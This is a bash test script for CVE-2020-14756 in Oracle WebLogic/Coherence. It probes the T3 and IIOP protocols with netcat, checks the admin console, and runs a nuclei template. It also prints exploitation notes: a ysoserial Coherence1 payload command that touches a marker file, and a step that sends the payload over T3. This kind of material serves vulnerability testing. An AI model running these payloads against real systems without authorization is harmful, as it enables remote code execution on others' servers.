#!/bin/bash
#
# CVE-2020-14756 - WebLogic T3/IIOP RCE Test Script
#
# This script tests the CVE-2020-14756 exploit against a WebLogic target.
#
# Usage:
#   ./run_test.sh [target_ip] [port]
#
# Example:
#   ./run_test.sh 192.168.1.100 7001
#
# Author: princechaddha
# CVE: CVE-2020-14756

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
TARGET="${1:-127.0.0.1}"
PORT="${2:-7001}"
MARKER="CVE202014756_$(date +%s)"

echo -e "${CYAN}============================================${NC}"
echo -e "${CYAN}CVE-2020-14756 Test Script${NC}"
echo -e "${CYAN}Oracle Coherence T3/IIOP RCE${NC}"
echo -e "${CYAN}============================================${NC}"
echo ""
echo -e "Target: ${TARGET}:${PORT}"
echo -e "Marker: ${MARKER}"
echo ""

# Step 1: Check if T3 protocol is accessible
echo -e "${YELLOW}[STEP 1] Testing T3 Protocol Accessibility${NC}"
echo "----------------------------------------------"

T3_RESPONSE=$(echo -e "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n" | timeout 5 nc -w 3 ${TARGET} ${PORT} 2>/dev/null || true)

if echo "${T3_RESPONSE}" | grep -q "HELO"; then
    echo -e "${GREEN}[+] T3 Protocol is accessible!${NC}"
    VERSION=$(echo "${T3_RESPONSE}" | grep -oP "HELO:\K[0-9.]+" || echo "unknown")
    echo -e "    WebLogic Version: ${VERSION}"
else
    echo -e "${RED}[-] T3 Protocol not accessible or disabled${NC}"
    echo "    Response: ${T3_RESPONSE:0:100}"
fi
echo ""

# Step 2: Check if IIOP protocol is accessible  
echo -e "${YELLOW}[STEP 2] Testing IIOP Protocol Accessibility${NC}"
echo "----------------------------------------------"

# GIOP header for NameService request
IIOP_PAYLOAD=$(echo -n "47494f50010200030000001700000002000000000000000b4e616d6553657276696365" | xxd -r -p)

IIOP_RESPONSE=$(echo -n "${IIOP_PAYLOAD}" | timeout 5 nc -w 3 ${TARGET} ${PORT} 2>/dev/null | xxd -p | tr -d '\n' || true)

if echo "${IIOP_RESPONSE}" | grep -qi "47494f50"; then
    echo -e "${GREEN}[+] IIOP Protocol is accessible!${NC}"
else
    echo -e "${YELLOW}[*] IIOP Protocol check inconclusive${NC}"
fi
echo ""

# Step 3: Vulnerability Assessment
echo -e "${YELLOW}[STEP 3] Vulnerability Assessment${NC}"
echo "----------------------------------------------"

echo -e "Checking for CVE-2020-14756 indicators..."

# Check for Coherence presence (if console is accessible)
CONSOLE_CHECK=$(curl -s -o /dev/null -w "%{http_code}" "http://${TARGET}:${PORT}/console" 2>/dev/null || echo "000")

if [ "${CONSOLE_CHECK}" == "200" ] || [ "${CONSOLE_CHECK}" == "302" ]; then
    echo -e "${GREEN}[+] WebLogic Console accessible (HTTP ${CONSOLE_CHECK})${NC}"
else
    echo -e "${YELLOW}[*] WebLogic Console not accessible (HTTP ${CONSOLE_CHECK})${NC}"
fi

echo ""
echo -e "${YELLOW}[STEP 4] Exploitation Notes${NC}"
echo "----------------------------------------------"
echo ""
echo "To exploit CVE-2020-14756:"
echo ""
echo "1. Generate payload with ysoserial:"
echo "   java -jar ysoserial.jar Coherence1 'touch /tmp/${MARKER}' > payload.bin"
echo ""
echo "2. Send payload via T3:"
echo "   python3 weblogic_t3.py ${TARGET} ${PORT} payload.bin"
echo ""
echo "3. Verify execution:"
echo "   Check if /tmp/${MARKER} was created on target"
echo ""

# Step 5: Nuclei Template Test
echo -e "${YELLOW}[STEP 5] Nuclei Template Test${NC}"
echo "----------------------------------------------"

if command -v nuclei &> /dev/null; then
    echo "Running nuclei template..."
    nuclei -t CVE-2020-14756.yaml -u "${TARGET}:${PORT}" -debug -v 2>&1 | tee nuclei_debug_output.txt
else
    echo -e "${YELLOW}[*] Nuclei not installed - skipping template test${NC}"
    echo "    Install with: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
fi

echo ""
echo -e "${CYAN}============================================${NC}"
echo -e "${CYAN}Test Complete${NC}"
echo -e "${CYAN}============================================${NC}"
